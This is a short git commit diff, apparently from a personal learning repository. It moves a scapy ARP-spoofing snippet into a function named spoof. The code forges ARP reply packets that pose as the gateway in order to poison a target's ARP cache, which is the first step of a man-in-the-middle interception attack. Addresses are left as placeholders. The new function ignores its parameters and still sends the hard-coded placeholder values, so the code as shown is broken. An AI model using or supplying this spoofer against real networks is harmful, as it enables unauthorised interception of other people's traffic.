927a9acd3a6b6adb4e668a6e73cd677ff15fa842
Ahmed Khaled <ahmedkhaledabab@gmail.com>
2020-01-31 00:14:01 +0200

    added a function, better

--- arp-spoofer/arp_spoofer.py
+++ arp-spoofer/arp_spoofer.py
@@ -6,6 +6,10 @@ Created on Tue Jan 28 02:14:38 2020
 
 import scapy.all as scapy
 
-# you can get the pdst and hwdst fields from the network scanner, psrc must be equal to the gateway IP address. 
-packet = scapy.ARP(op=2, pdst="<target_ip>", hwdst="<target_mac>", psrc="<gw_ip>")
-scapy.send(packet)
+
+
+
+def spoof(target_ip, spoo_ip):
+    # you can get the pdst and hwdst fields from the network scanner, psrc must be equal to the gateway IP address. 
+    packet = scapy.ARP(op=2, pdst="<target_ip>", hwdst="<target_mac>", psrc="<gw_ip>")
+    scapy.send(packet)
